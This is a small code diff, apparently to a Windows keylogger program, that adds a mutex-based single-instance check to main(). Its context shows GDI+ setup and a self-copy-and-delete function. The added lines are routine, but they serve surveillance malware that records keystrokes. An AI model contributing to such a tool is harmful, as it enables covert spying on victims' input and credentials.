@@ -2001,6 +2001,14 @@ void HandleSelfCopyAndDelete()
 
 int main()
 {
+    // 检查是否已有实例在运行
+    HANDLE hMutex = CreateMutex(NULL, TRUE, TEXT("KeyloggerInstanceMutex"));
+    if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS)
+    {
+        if (hMutex) CloseHandle(hMutex);
+        return 0; // 已有实例在运行，直接退出
+    }
+
     // 初始化GDI+
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
@@ -2052,5 +2060,9 @@ int main()
     
     // 清理GDI+
     GdiplusShutdown(gdiplusToken);
+    
+    // 释放互斥量
+    CloseHandle(hMutex);
+    
     return 0;
 }
